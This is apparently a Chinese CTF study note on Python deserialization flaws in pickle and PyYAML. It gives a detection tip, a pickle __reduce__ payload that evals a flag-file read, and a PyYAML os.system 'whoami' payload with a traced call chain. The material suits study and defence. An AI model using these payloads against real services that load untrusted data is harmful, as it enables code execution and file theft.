---
title: Python反序列化
date: 2023/5/1 15:00:25
categories:
- CTF
---

[pickle反序列化初探](https://xz.aliyun.com/t/7436)

题目

https://blog.csdn.net/satasun/article/details/109708593

python魔术方法指南

https://blog.csdn.net/bluehawksky/article/details/79027055

https://ca01h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/



## pickle

序列化

```python
pickle.dump(文件) 
pickle.dumps(字符串)
```

反序列化

```python
pickle.load(文件)
pickle.loads(字符串)
```

检测

> 全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。

payload

```python
#py2
import pickle
import urllib

class payload(object):
    def __reduce__(self):
        #第一个参数返回函数名，第二个参数返回函数所需参数
       return (eval, ("open('/flag.txt','r').read()",))

a = pickle.dumps(payload())
a = urllib.quote(a)
print a
```



## yaml

序列化

```python
yaml.dump()
```

反序列化

```python
yaml.load()
```

漏洞成因

由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 `!!` 来扩展额外的解析能力。

在python的 PyYAML中

![image-20221105145956780](E:\typora img\image-20221105145956780.png)

yaml < 5.1

```python
import yaml

yaml.load('exp: !!python/object/apply:os.system ["whoami"]')
```

进入construct_python_object_apply函数

![image-20221105152757350](E:\typora img\image-20221105152757350.png)

进入make_python_instance函数

![image-20221105152926377](E:\typora img\image-20221105152926377.png)

![image-20221105151915033](E:\typora img\image-20221105151915033.png)

进入find_python_name函数

![image-20221105152100378](E:\typora img\image-20221105152100378.png)

![image-20221105152121346](E:\typora img\image-20221105152121346.png)

然后`return getattr('os','system')` 返回给cls

![image-20221105152504005](E:\typora img\image-20221105152504005.png)

然后`return cls(*args, **kwds)` --> `os.system(whoami)` 就执行了我们构造的命令。

最后返回给instance

![image-20221105152654175](E:\typora img\image-20221105152654175.png)

如何构造payload

![image-20221105154558121](E:\typora img\image-20221105154558121.png)

![image-20221105155002281](E:\typora img\image-20221105155002281.png)